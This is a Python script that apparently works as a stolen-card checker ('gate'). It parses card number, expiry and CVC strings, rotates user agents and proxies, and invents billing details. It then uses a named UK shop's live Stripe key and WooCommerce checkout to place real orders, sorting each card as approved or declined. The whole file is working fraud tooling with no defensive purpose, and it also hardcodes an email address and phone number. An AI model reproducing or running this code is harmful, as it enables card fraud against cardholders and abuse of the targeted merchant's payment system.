import json
import random
import re
import string
import time
from uuid import uuid4
import requests

from helpers import classify_gate_response

HTTP_TIMEOUT = (10, 25)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
]

FIRST_NAMES = ['Eslam', 'James', 'John', 'Robert', 'Michael', 'William']
LAST_NAMES = ['Ramadan', 'Smith', 'Johnson', 'Williams', 'Brown', 'Jones']
STREETS = ['new yirl', 'Main St', 'Oak Ave', 'Maple Dr', 'Cedar Ln']
CITIES_STATES = [
    ('new york', '', 'EC1A 1BB'),
    ('London', '', 'EC1A 1BB'),
    ('Manchester', '', 'M1 1AE'),
]

SITE_URL = 'https://www.gbradburyltd.co.uk'
STRIPE_PK = 'pk_live_51TXK24JwY9cexbFxKOcl5gPMw7QPuRmBoTUh2SR2sNo8tGYZbjwSdKi6c6rzH8CnuelNtDdCXSkwBxTzP704o6eM00beQr7w6p'

ST1_CHARGED_RESPONSE = "Payment Success"


def _http_error(exc: requests.RequestException) -> dict:
    low = str(exc).lower()
    if isinstance(exc, requests.Timeout) or "timed out" in low:
        return {"status": "ERROR", "response": "Request timed out", "time": "0s"}
    if isinstance(exc, requests.exceptions.ProxyError) or "proxy" in low or "tunnel" in low:
        return {"status": "ERROR", "response": str(exc)[:200], "time": "0s"}
    return {"status": "ERROR", "response": str(exc)[:200], "time": "0s"}


def _process_card_sync(cc: str, mm: str, yy: str, cvc: str, proxy_url: str | None = None) -> dict:
    started = time.perf_counter()
    if len(yy) == 2:
        yy = "20" + yy[-2:]
    mm = mm.zfill(2)

    try:
        user_agent = random.choice(USER_AGENTS)
        first_name = random.choice(FIRST_NAMES)
        last_name = random.choice(LAST_NAMES)
        full_name = f"{first_name} {last_name}"
        email = f"eslamramadanv1@gmail.com"
        address = random.choice(STREETS)
        city, state, zip_code = random.choice(CITIES_STATES)

        session = requests.Session()
        session.trust_env = False
        if proxy_url:
            session.proxies = {"http": proxy_url, "https": proxy_url}

        # 1. تهيئة الجلسة وجلب الكوكيز والـ Nonce
        init_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'user-agent': user_agent,
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
        }
        init_resp = session.get(f'{SITE_URL}/', headers=init_headers, timeout=HTTP_TIMEOUT)
        
        if init_resp.status_code >= 400:
            elapsed = f"{time.perf_counter() - started:.2f}s"
            return {"status": "ERROR", "response": f"Site HTTP {init_resp.status_code}", "time": elapsed}

        # إضافة منتج للسلة لفتح مسار الـ Checkout الصحيح
        cart_data = {
            'success_message': '"1 LT BRACKET 1x1" has been added to your cart',
            'product_sku': 'D023AEV',
            'product_id': '1780',
            'quantity': '1',
        }
        session.post(f'{SITE_URL}/', params={'wc-ajax': 'add_to_cart'}, data=cart_data, timeout=HTTP_TIMEOUT)
        
        get_checkout = session.get(f'{SITE_URL}/checkout/', timeout=HTTP_TIMEOUT)
        nonce_match = re.search(r'name="woocommerce-process-checkout-nonce"\s+value="([^"]+)"', get_checkout.text)
        checkout_nonce = nonce_match.group(1) if nonce_match else '29829fefec'

        # 2. إعدادات ريكوست Stripe مع البصمة الكاملة
        stripe_url = 'https://api.stripe.com/v1/payment_methods'
        stripe_headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': user_agent
        }
        
        client_session_id = str(uuid4())
        elements_session_id = f"elements_session_{''.join(random.choices(string.ascii_letters + string.digits, k=12))}"
        
        stripe_data = {
            'billing_details[name]': full_name,
            'billing_details[email]': email,
            'billing_details[phone]': '+201153262807',
            'billing_details[address][city]': city,
            'billing_details[address][country]': 'GB',
            'billing_details[address][line1]': address,
            'billing_details[address][line2]': '',
            'billing_details[address][postal_code]': zip_code,
            'billing_details[address][state]': state,
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvc,
            'card[exp_year]': yy,
            'card[exp_month]': mm,
            'allow_redisplay': 'unspecified',
            'payment_user_agent': 'stripe.js/9e9080bb94; stripe-js-v3/9e9080bb94; payment-element; deferred-intent; autopm',
            'referrer': SITE_URL,
            'time_on_page': str(random.randint(30000, 120000)),
            'client_attribution_metadata[client_session_id]': client_session_id,
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
            'client_attribution_metadata[merchant_integration_version]': '2021',
            'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
            'client_attribution_metadata[payment_method_selection_flow]': 'automatic',
            'client_attribution_metadata[elements_session_id]': elements_session_id,
            'client_attribution_metadata[elements_session_config_id]': str(uuid4()),
            'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
            'key': STRIPE_PK,
            '_stripe_version': '2025-09-30.clover'
        }

        stripe_resp = session.post(stripe_url, headers=stripe_headers, data=stripe_data, timeout=HTTP_TIMEOUT)
        try:
            stripe_json = stripe_resp.json()
        except Exception as je:
            elapsed = f"{time.perf_counter() - started:.2f}s"
            return {"status": "ERROR", "response": f"Stripe JSON error: {je}", "time": elapsed}

        if 'id' not in stripe_json:
            err_text = stripe_json.get('error', {}).get('message', 'Stripe Error')
            elapsed = f"{time.perf_counter() - started:.2f}s"
            return {"status": "DECLINED", "response": err_text, "time": elapsed}

        payment_method_id = stripe_json['id']

        # 3. إتمام الـ Checkout في المتجر
        checkout_url = f'{SITE_URL}/?wc-ajax=checkout'
        checkout_headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': SITE_URL,
            'referer': f'{SITE_URL}/checkout/',
            'x-requested-with': 'XMLHttpRequest',
            'user-agent': user_agent
        }
        
        checkout_data = {
            'billing_email': email,
            'billing_first_name': first_name,
            'billing_last_name': last_name,
            'billing_country': 'GB',
            'billing_address_1': address,
            'billing_address_2': '',
            'billing_city': city,
            'billing_state': state,
            'billing_postcode': zip_code,
            'billing_phone': '+201153262807',
            'shipping_country': 'GB',
            'shipping_method[0]': 'wbs:5:83d48455_standard_delivery',
            'payment_method': 'stripe',
            'wc-stripe-selected-upe-payment-type': 'card',
            'terms': 'on',
            'terms-field': '1',
            'woocommerce-process-checkout-nonce': checkout_nonce,
            '_wp_http_referer': f'{SITE_URL}/checkout/',
            'wc-stripe-payment-method': payment_method_id
        }

        checkout_resp = session.post(checkout_url, headers=checkout_headers, data=checkout_data, timeout=HTTP_TIMEOUT)
        elapsed = f"{time.perf_counter() - started:.2f}s"

        try:
            res_json = checkout_resp.json()
        except Exception:
            return {"status": "ERROR", "response": checkout_resp.text[:200], "time": elapsed}

        messages = res_json.get('messages', '')
        result_status = res_json.get('result', '')

        if "success" in result_status or "order_received" in str(res_json.get('redirect', '')):
            return {"status": "APPROVED", "response": ST1_CHARGED_RESPONSE, "time": elapsed}

        clean_msg = re.sub(r'<[^>]+>', '', str(messages)).strip()
        if not clean_msg:
            clean_msg = str(res_json.get('message') or res_json.get('code') or "Declined")

        full_blob = json.dumps(res_json, default=str)
        st, out_msg, code = classify_gate_response(f"{clean_msg} {full_blob}")
        
        if st == "charged":
            return {"status": "APPROVED", "response": ST1_CHARGED_RESPONSE, "time": elapsed}
        return {"status": "DECLINED", "response": out_msg or clean_msg, "time": elapsed}

    except requests.RequestException as exc:
        elapsed = f"{time.perf_counter() - started:.2f}s"
        err = _http_error(exc)
        err["time"] = elapsed
        return err
    except Exception as exc:
        elapsed = f"{time.perf_counter() - started:.2f}s"
        return {"status": "ERROR", "response": str(exc)[:200], "time": elapsed}


def _clean_gate_msg(msg: str, limit: int = 120) -> str:
    s = re.sub(r"<[^>]+>", " ", str(msg or ""))
    s = re.sub(r"\s+", " ", s).strip()
    if "{" in s:
        s = s.split("{", 1)[0].strip()
    return (s[:limit] if s else "Declined")


def _map_stripe1_result(raw: dict) -> tuple[str, str, str]:
    api_status = str(raw.get("status") or "")
    resp = str(raw.get("response") or "")
    clean_resp = _clean_gate_msg(resp, 200)
    blob = json.dumps(raw, default=str)
    text = f"{api_status} {resp} {blob}"

    if api_status.upper() == "APPROVED":
        return "charged", ST1_CHARGED_RESPONSE, "charged"

    st, msg, code = classify_gate_response(text, status_hint=api_status, code_hint="")
    return st, _clean_gate_msg(msg) or clean_resp, code


def check_card_str(cc_str: str, proxy_url: str | None = None) -> tuple[str, str, str]:
    parts = cc_str.replace("/", "|").split("|")
    if len(parts) < 4:
        return "error", "invalid_cc_format", "bad_format"
    cc, mm, yy, cvc = [p.strip() for p in parts[:4]]
    raw = _process_card_sync(cc, mm, yy, cvc, proxy_url)
    return _map_stripe1_result(raw)
